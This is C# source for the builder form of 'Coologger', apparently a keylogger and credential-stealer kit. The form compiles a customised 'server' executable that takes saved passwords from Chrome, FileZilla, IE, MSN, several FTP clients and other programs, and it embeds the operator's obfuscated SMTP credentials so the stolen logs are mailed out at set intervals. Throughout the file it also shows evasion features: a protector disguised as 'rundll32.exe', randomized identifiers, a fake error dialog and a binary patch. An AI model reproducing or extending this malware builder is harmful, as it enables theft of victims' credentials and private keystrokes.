using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Coologger.Check;
using Microsoft.VisualBasic;

namespace Coologger
{
    public partial class AdvancedForm : Form
    {
/*
        private MailMessage _emailMessage = new MailMessage();
*/
        public string Process;
        private byte[] _fileData;
/*
        private SmtpClient _sendmail = new SmtpClient();
*/
        private string _pmutex;
        private string _source;

        public AdvancedForm()
        {
            InitializeComponent();
        }

        #region Singleton

        private static AdvancedForm _instance;
        private static readonly object PadLock = new object();

        public static AdvancedForm Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _instance ?? (_instance = new AdvancedForm());
                }
            }
        }

        #endregion

        private void PictureBox1Click(object sender, EventArgs e)
        {
            Hide();
        }

        private void Form5Load(object sender, EventArgs e)
        {
            Thread t = new Thread(ThreadChecker.CheckThreads);
            t.Start();

            TextBox13.Text = Util.randomString(10);
            TextBox12.Text = Util.randomString(10);
            TextBox11.Text = Util.randomString(10);
            TextBox10.Text = Util.randomString(10);
            TextBox9.Text = Util.randomString(10);
            TextBox5.Text = Util.randomString(20);

            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
        }

        private void FButton5Click(object sender, EventArgs e)
        {
            if (RadioButton1.Checked)
            {
                MessageBox.Show(TextBox2.Text, TextBox3.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (RadioButton2.Checked)
            {
                MessageBox.Show(TextBox2.Text, TextBox3.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (RadioButton3.Checked)
            {
                MessageBox.Show(TextBox2.Text, TextBox3.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void Compile(string code, string path, bool formProgram, string mainClass)
        {
            var providerOptions = new Dictionary<string, string> {{"CompilerVersion", "v2.0"}};
            var codeProvider = new VBCodeProvider(providerOptions);
            var parameters = new CompilerParameters {GenerateExecutable = true, OutputAssembly = path};
            if (formProgram) parameters.CompilerOptions = "/target:winexe";
            parameters.MainClass = mainClass;
            parameters.IncludeDebugInformation = false;
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Data.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.XML.dll");
            if (CheckBox26.Checked && (code == _source))
            {
                parameters.EmbeddedResources.Add(Application.StartupPath + "\\Process.resources");
            }

            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.Count <= 0) return;
            foreach (CompilerError e in results.Errors)
            {
                MessageBox.Show(e.ToString());
            }
        }

        private void FButton6Click(object sender, EventArgs e)
        {
            _source = Global.Source;
            string sourceProtect = Global.sourceProtect;
            if (NumericUpDown1.Value == 0)
            {
                MessageBox.Show("Please select your log sending interval");
                return;
            }

            _pmutex = Util.randomString(new Random().Next(8, 12));
            _source = _source.Replace("%19%", CheckBox2.Checked.ToString());
            _source = _source.Replace("%18%", CheckBox42.Checked.ToString());

            _source = _source.Replace("%17%", CheckBox40.Checked.ToString());
            _source = _source.Replace("%14%", CheckBox1.Checked.ToString());

            _source = _source.Replace("%15%", CheckBox39.Checked.ToString());
            _source = _source.Replace("%3%", CheckBox20.Checked.ToString());

            _source = _source.Replace("%10%", CheckBox32.Checked.ToString());
            _source = _source.Replace("%6%", CheckBox23.Checked.ToString());

            _source = _source.Replace("%9%", CheckBox3.Checked.ToString());
            if (CheckBox3.Checked) _source = _source.Replace("*logonly*", TextBox1.Text);

            _source = _source.Replace("%1%", CheckBox25.Checked.ToString());
            _source = _source.Replace("%2%", CheckBox27.Checked.ToString());

            _source = _source.Replace("%5%", CheckBox22.Checked.ToString());
            _source = _source.Replace("%4%", CheckBox21.Checked.ToString());

            _source = _source.Replace("%7%", CheckBox29.Checked.ToString());
            _source = _source.Replace("%11%", CheckBox30.Checked.ToString());

            _source = _source.Replace("%5%", CheckBox22.Checked.ToString());
            _source = _source.Replace("%5%", CheckBox22.Checked.ToString());

            if (CheckBox31.Checked)
            {
                //needs to be entered
            }

            _source = _source.Replace("%13%", CheckBox28.Checked.ToString());
            if (CheckBox28.Checked) _source = _source.Replace("*process*", Process);

            _source = _source.Replace("%8%", CheckBox24.Checked.ToString());
            _source = _source.Replace("%12%", CheckBox26.Checked.ToString());

            _source = _source.Replace("*1*", CheckBox12.Checked ? "CoreFTP.R2V0RkY()" : "");

            _source = _source.Replace("*2*", CheckBox14.Checked ? "Chrome.GetChrome()" : "");
            _source = _source.Replace("*3*", CheckBox12.Checked ? "Filezilla.ShoitZilla()" : "");
            _source = _source.Replace("*4*", CheckBox16.Checked ? "MSN.getPwd()" : "");
            _source = _source.Replace("*5*", CheckBox12.Checked ? "IE78.getie()" : "");
            _source = _source.Replace("*6*", CheckBox12.Checked ? "FlashFXP.FlashFXP()" : "");
            _source = _source.Replace("*7*", CheckBox18.Checked ? "CoreFTP.CoreFTP()" : "");
            _source = _source.Replace("*8*", CheckBox15.Checked ? "FlashFXP.FlashFXP()" : "");
            _source = _source.Replace("*9*", CheckBox35.Checked ? "SmartFTP.SmartFTP()" : "");
            _source = _source.Replace("*10*", CheckBox33.Checked ? "FTPCommander.FtpCommander()" : "");
            _source = _source.Replace("*11*", CheckBox34.Checked ? "No_IP.IpRecord()" : "");
            _source = _source.Replace("*12*", CheckBox36.Checked ? "Winkey.GetProductKey()" : "");
            _source = _source.Replace("*13*", CheckBox37.Checked ? "Nexus.dbstealer()" : "");
            _source = _source.Replace("*14*", CheckBox38.Checked ? "RSBEWT.RsBotDecrypter()" : "");
            _source = _source.Replace("*15*", ""); //, CheckBox44.Checked ? "" : "");
            _source = _source.Replace("*16*", CheckBox43.Checked ? "SS.GSU()" : "");

            _source = _source.Replace("*uninstall*", TextBox6.Text);
            _source = _source.Replace("*pmutex*", _pmutex);
            _source = _source.Replace("*mutex*", TextBox5.Text);

            sourceProtect = sourceProtect.Replace("*mutex*", _pmutex);

            _source = _source.Replace("[49]", TextBox13.Text);
            _source = _source.Replace("[50]", TextBox12.Text);
            _source = _source.Replace("[51]", TextBox11.Text);
            _source = _source.Replace("[52]", TextBox10.Text);
            _source = _source.Replace("[53]", TextBox9.Text);
            _source = _source.Replace("*title*", TextBox3.Text);
            _source = _source.Replace("*install*", TextBox4.Text);
            _source = _source.Replace("*error*", TextBox2.Text);
            _source = _source.Replace("*email*", Util.encryptMe(Util.ObfuscateString(Util.des.Encrypt(TextBox16.Text))));
            _source = _source.Replace("*emailpass*",
                                    Util.encryptMe(Util.ObfuscateString(Util.des.Encrypt(TextBox15.Text))));
            _source = _source.Replace("*interval*", (NumericUpDown1.Value*60000).ToString());
            _source = _source.Replace("*host*", TextBox14.Text);
            _source = _source.Replace("*port*", 587.ToString());

            sourceProtect = sourceProtect.Replace("*name*", TextBox4.Text);

            if (CheckBox26.Enabled)
            {
                try
                {
                    Compile(sourceProtect, Application.StartupPath + "\\rundll32.exe", true, "");
                }
                catch
                {
                    try
                    {
                        gen(Application.StartupPath + "\\rundll32.exe", sourceProtect);
                    }
                    catch
                    {
                    }
                }

                try
                {
                    var r = new ResourceWriter(Application.StartupPath + "\\Process.resources");
                    var oFile = new FileInfo(Application.StartupPath + "\\rundll32.exe");
                    FileStream oFileStream = oFile.OpenRead();
                    long lBytes = oFileStream.Length;
                    if (lBytes > 0)
                    {
                        _fileData = new byte[lBytes];
                        oFileStream.Read(_fileData, 0, (int) lBytes);
                        oFileStream.Close();
                    }
                    r.AddResource(Path.GetFileName(Application.StartupPath + "\\rundll32.exe"),
                                  Convert.ToBase64String(_fileData));
                }
                catch
                {
                    CheckBox26.Checked = false;
                }
            }

            //
            if (CheckBox28.Checked & CheckBox26.Enabled)
            {
                try
                {
                    Compile(sourceProtect, Application.StartupPath + "\\rundll32.exe", true, "");
                }
                catch
                {
                    try
                    {
                        gen(Application.StartupPath + "\\rundll32.exe", sourceProtect);
                    }
                    catch
                    {
                    }
                }

                try
                {
                    var r = new ResourceWriter(Application.StartupPath + "\\Process.resources");
                    var oFile = new FileInfo(Application.StartupPath + "\\rundll32.exe");
                    FileStream oFileStream = oFile.OpenRead();
                    long lBytes = oFileStream.Length;
                    if (lBytes > 0)
                    {
                        _fileData = new byte[lBytes];
                        oFileStream.Read(_fileData, 0, (int) lBytes);
                        oFileStream.Close();
                    }
                    r.AddResource(Path.GetFileName(Application.StartupPath + "\\rundll32.exe"),
                                  Convert.ToBase64String(_fileData));
                }
                catch
                {
                    CheckBox26.Checked = false;
                }
            }
            var sfd = new SaveFileDialog();
            sfd.Filter = "Executables *.exe|*.exe";
            sfd.ShowDialog();
            if (sfd.FileName.Length > 0)
            {
                string[] vars = {
                                    "[1]", "[2]", "[3]", "[4]", "[5]", "[6]", "[7]", "[8]", "[9]", "[10]", "[11]",
                                    "[12]",
                                    "[13]", "[14]", "[15]", "[16]", "[17]", "[18]", "[20]", "[21]", "[23]", "[24]",
                                    "[25]",
                                    "[26]", "[27]", "[28]", "[29]", "[30]", "[31]", "[32]", "[33]", "[34]", "[35]",
                                    "[36]",
                                    "[37]", "[38]", "[39]", "[40]", "[41]", "[42]", "[43]", "[44]", "[45]", "[46]",
                                    "[47]",
                                    "[48]", "[49]", "[50]", "[51]", "[52]", "[53]", "[54]", "[55]", "[56]", "[57]",
                                    "[58]",
                                    "[59]", "[60]", "[61]", "[62]", "[63]", "[64]", "[65]", "[66]", "[67]", "[68]",
                                    "[69]",
                                    "[70]", "[71]", "[72]", "[73]", "[74]", "[75]", "[76]", "[77]", "[78]", "[79]",
                                    "[80]",
                                    "[81]", "[82]", "[83]", "[84]", "[85]", "[86]", "[87]", "[88]", "[89]", "[90]",
                                    "[91]",
                                    "[92]", "[93]", "[94]", "[95]", "[96]", "[97]", "[98]", "[99]", "[100]", "[101]",
                                    "[102]", "[103]", "[104]", "[105]", "[106]", "[107]", "[108]", "[109]", "[110]",
                                    "[111]", "[112]", "[113]", "[114]", "[115]", "[116]", "[117]", "[118]", "[119]",
                                    "[120]", "[121]", "[122]", "[123]", "[124]", "[125]", "[126]", "[127]", "[128]",
                                    "[129]", "[130]", "[131]", "[132]", "[133]", "[134]", "[135]", "[136]", "[137]",
                                    "[138]", "[139]", "[140]", "[141]"
                                };

                for (int i = 0; i <= vars.Length - 1; i++)
                {
                    _source = _source.Replace(vars[i], Util.randomString(15));
                    Thread.Sleep(100); //generates same key over & over otherwise
                }

                try
                {
                    Compile(_source, sfd.FileName, true, "");
                    if (CheckBox41.Checked)
                    {
                        var w = new FileStream(sfd.FileName, FileMode.Open, FileAccess.Write);
                        w.Seek(244, SeekOrigin.Begin);
                        w.WriteByte(11);
                        w.Flush();
                        w.Close();
                    }
                    MessageBox.Show("Your server has been built");
                }
                catch
                {
                    try
                    {
                        gen(sfd.FileName, _source);
                        if (CheckBox41.Checked)
                        {
                            var w = new FileStream(sfd.FileName, FileMode.Open, FileAccess.Write);
                            w.Seek(244, SeekOrigin.Begin);
                            w.WriteByte(11);
                            w.Flush();
                            w.Close();
                        }
                        MessageBox.Show("Primary build method failed, built with back up mechanism");
                    }
                    catch
                    {
                        MessageBox.Show("Failed to build", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }
                }
            }
            try
            {
                if (File.Exists(Application.StartupPath + "\\rundll32.exe"))
                    File.Delete(Application.StartupPath + "\\rundll32.exe");

                if (File.Exists(Application.StartupPath + "\\Process.resources"))
                    File.Delete(Application.StartupPath + "\\Process.resources");
            }
            catch
            {
            }
        }

        private void CheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            CheckBox[] boxes = {
                                   CheckBox12, CheckBox13, CheckBox14, CheckBox15,
                                   CheckBox16, CheckBox17, CheckBox18, CheckBox19,
                                   CheckBox33, CheckBox34, CheckBox35, CheckBox36,
                                   CheckBox37, CheckBox38, CheckBox43, CheckBox44
                               };
            if (CheckBox5.Checked)
            {
                foreach (CheckBox t in boxes)
                    t.Checked = true;
            }
            else
            {
                foreach (CheckBox t in boxes)
                    t.Checked = false;
            }
        }

        private void FButton1_Click(object sender, EventArgs e)
        {
            try
            {
                var client = new SmtpClient(TextBox14.Text, 587);
                var msg = new MailMessage();


                client.EnableSsl = true;
                client.Credentials =
                    new NetworkCredential(TextBox16.Text, TextBox15.Text);

                msg.To.Add(new MailAddress(TextBox16.Text));
                msg.From = new MailAddress(TextBox16.Text);
                msg.Subject = "COOLogger";
                msg.Body = "Problem? Not for you!";

                client.Send(msg);
                msg.Dispose();
                MessageBox.Show("Success! Message Sent", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            catch (Exception exception)
            {
                MessageBox.Show("Test email failed to send. Error:\n" + exception.Message);
            }
        }

        private void CheckBox28_CheckedChanged(object sender, EventArgs e)
        {
            if (CheckBox28.Checked)
                ProcessSelector.Instance.Show();
        }

        private void CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            TextBox1.Enabled = CheckBox3.Checked;
        }

        private void FButton2_Click(object sender, EventArgs e)
        {
            MenuForm.Instance.BringToFront();
        }

        private void FButton4_Click(object sender, EventArgs e)
        {
            SupportForm.Instance.Show();
        }

        private void FButton3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("v" + Application.ProductVersion);
        }

        private void FButton7_Click(object sender, EventArgs e)
        {
            TextBox5.Text = Util.randomString(20);
        }

        public void gen(string output, string source)
        {
            ICodeCompiler Compiler = new VBCodeProvider().CreateCompiler();
            var Parameters = new CompilerParameters();
            CompilerResults cResults;
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = output;
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add("System.Data.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.Design.dll");
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.ReferencedAssemblies.Add("System.XML.dll");
            Parameters.ReferencedAssemblies.Add("System.Management.dll");
            Parameters.ReferencedAssemblies.Add("System.Management.dll");
            if (CheckBox26.Checked & (source == this._source))
                Parameters.EmbeddedResources.Add(Application.StartupPath + "\\Process.resources");

            var Version = new Dictionary<string, string>();
            Version.Add("Windows", "v1.0");
            Parameters.CompilerOptions = "/target:winexe";
            cResults = Compiler.CompileAssemblyFromSource(Parameters, source);
            if (cResults.Errors.Count > 0)
            {
                foreach (CompilerError error in cResults.Errors)
                    MessageBox.Show("Error: " + error.ErrorText, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void FButton8_Click(object sender, EventArgs e)
        {
            var test = new WebClient();
            string tests = null;
            try
            {
                tests = test.DownloadString(TextBox6.Text);
                if (tests.Contains("CL Removal List") & TextBox6.Text.Contains("IDs"))
                {
                    MessageBox.Show("Link appears to be valid");
                }
                else
                {
                    MessageBox.Show("Link appears to be using incorrect format, make sure it is directing to /IDs.txt");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Ooops, something appears to be wrong with that link - " + ex.Message);
            }
        }

        private void CheckBox42_CheckedChanged(object sender, EventArgs e)
        {
            TextBox6.Enabled = CheckBox42.Checked;
            ;
        }

        #region MouseControls

        private Point _lastClick;

        private void MouseMovedControl(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Left += e.X - _lastClick.X;
                Top += e.Y - _lastClick.Y;
            }
        }

        private void MouseDown_Control(object sender, MouseEventArgs e)
        {
            _lastClick = new Point(e.X, e.Y);
        }

        #endregion

        private void RichTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}